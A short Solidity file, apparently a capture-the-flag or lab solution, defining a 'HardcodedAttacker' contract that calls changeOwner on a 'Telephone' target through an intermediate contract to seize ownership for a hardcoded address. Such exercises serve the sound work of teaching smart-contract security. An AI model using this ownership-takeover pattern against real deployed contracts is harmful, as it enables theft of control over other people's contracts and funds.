pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}


contract HardcodedAttacker {
    address public instance;

    address public factory = 0x5FbDB2315678afecb367f032d93F642f64180aa3;

    constructor(address _instance) {
        instance = _instance;
    }

    function attack() public {
        Telephone(instance).changeOwner(factory);
    }
}